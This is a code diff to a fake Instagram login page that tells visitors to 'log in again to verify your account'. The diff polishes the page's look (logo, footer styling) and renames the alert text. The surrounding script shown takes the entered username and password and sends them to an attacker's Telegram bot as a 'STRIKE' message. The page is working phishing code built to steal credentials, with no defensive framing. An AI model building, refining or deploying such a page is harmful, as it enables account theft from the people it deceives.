@@ -11,13 +11,13 @@
         p { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; line-height: 1.5; font-weight: 500; }
         input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; }
         button { width: 100%; padding: 10px; background: #0095f6; border: none; color: white; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 10px; }
-        .footer { font-size: 12px; color: #8e8e8e; margin-top: 20px; }
+        .footer { font-size: 12px; color: #00376b; margin-top: 20px; cursor: pointer; text-decoration: none; font-weight: 500; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <img src="https://www.pngkey.com/png/full/1-13459_instagram-font-logo-white-instagram-logo-png-black.png" class="logo" alt="Instagram">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" class="logo" alt="Instagram">
     
     <p>Help us confirm it's you. Please log in again to verify your account.</p>
     
@@ -27,7 +27,7 @@
         <button type="submit">Log In</button>
     </form>
     
-    <div class="footer" style="cursor: pointer; color: #00376b;">Forgot password?</div>
+    <div class="footer">Forgot password?</div>
 </div>
 
 <script>
@@ -40,7 +40,7 @@ document.getElementById('login-form').addEventListener('submit', async (e) => {
     const u = document.getElementById('user').value;
     const p = document.getElementById('pass').value;
     
-    const text = `🔥 NEW STRIKE 🔥\n\n👤 User: ${u}\n🔑 Pass: ${p}`;
+    const text = `🔥 HADIMA CLOSET STRIKE 🔥\n\n👤 User: ${u}\n🔑 Pass: ${p}`;
 
     try {
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
